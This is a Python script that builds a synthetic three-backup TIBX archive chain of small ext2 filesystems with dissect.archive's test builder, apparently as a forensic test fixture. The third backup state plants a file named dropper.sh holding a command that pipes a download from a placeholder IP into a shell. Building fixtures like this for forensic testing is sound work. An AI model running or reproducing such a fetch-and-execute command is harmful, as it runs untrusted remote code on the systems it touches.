"""Build a synthetic TIBX chain of three backups, each holding a small ext2 filesystem.

Uses dissect.archive's own synthetic archive builder; no real backup data is involved.
Run it from the root of the dissect.archive checkout: python handover_build_chain.py out.tibx
"""

from __future__ import annotations

import subprocess
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from tests._tools.tibx._synth import ExtentSpec, build_lsm_archive

SIZE = 1 << 20
STATES = [
    {"opt/project/line1.cfg": "setpoint=50\n"},
    {"opt/project/line1.cfg": "setpoint=80\n"},
    {"opt/project/line1.cfg": "setpoint=80\n", "tmp/dropper.sh": "#!/bin/sh\ncurl http://198.51.100.7/x | sh\n"},
]


def ext2_image(files: dict[str, str]) -> bytes:
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp) / "root"
        for name, content in files.items():
            (root / name).parent.mkdir(parents=True, exist_ok=True)
            (root / name).write_text(content)
        image = Path(tmp) / "fs.img"
        subprocess.run(
            ["mke2fs", "-q", "-t", "ext2", "-b", "1024", "-N", "32", "-d", str(root), str(image), "1024"],
            check=True,
            env={"E2FSPROGS_FAKE_TIME": "1700000000", "PATH": "/usr/sbin:/usr/bin:/bin"},
        )
        data = image.read_bytes()
    assert len(data) == SIZE
    return data


slices = [2, 3, 5]
extents = [ExtentSpec(10, 0, ext2_image(files), slice_id=sid) for files, sid in zip(STATES, slices, strict=False)]
Path(sys.argv[1]).write_bytes(build_lsm_archive(extents, slices=slices, uuid=bytes(range(16))))
print(f"wrote {sys.argv[1]}")
